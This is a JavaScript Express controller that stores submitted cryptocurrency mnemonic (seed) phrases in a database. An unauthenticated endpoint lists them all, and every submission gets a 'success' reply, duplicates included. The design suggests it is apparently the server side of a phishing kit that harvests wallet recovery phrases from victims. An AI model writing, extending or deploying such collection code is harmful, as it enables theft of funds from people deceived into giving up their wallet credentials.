const { validationResult } = require('express-validator');
const MnemonicPhrase = require('../db/models/MnemonicPhrase');

const MnemonicPhrasesController = () => {

    this.phraseExists = async (phrase) => {

        return new Promise((resolve, reject) => {
            MnemonicPhrase.find({phrase: phrase}, (error, docs) => {
                if (error) {
                    reject('Error!');
                }

                if (docs) {
                    if (docs.length >= 1) {
                        resolve(true);
                        return;
                    }
                }

                resolve(false);
            });
        });

    };

    this.index = (req, res) => {
        MnemonicPhrase.find({}, (err, data) => {
            if (err) {
                res.status(500).send({
                    msg: `Error: ${err}`
                });
                return;
            }

            res.status(200).send(data);

            return;
        });
    }

    this.store = async (req, res) => {

        const vError = validationResult(req);

        if (!vError.isEmpty()) {        //error occurred
            res.status(200).send(vError);
            return;
        }

        const phraseExists = await this.phraseExists(req.body.phrase);

        if (phraseExists) {
            // res.status(200).send({
            //     errors: [
            //         {
            //             value: `${req.body.phrase}`,
            //             msg: "Phrase is already present in the database",
            //             param: "phrase",
            //             location: "body"
            //         }
            //     ]
            // });
            // return;

            //ignore request
            res.status(200).send({
                msg: "success"
            });
            return;
        }

        //try inserting the data in the database
        MnemonicPhrase.create({
            phrase: req.body.phrase
        }, err => {
            if (err) {        //unable to add new data to the database
                res.status(500).send({
                    msg: `Error: ${err}`
                });
                return;
            }

            res.status(200).send({
                msg: "success"
            });
            return;
        });
    };

    return this;
};

module.exports = MnemonicPhrasesController;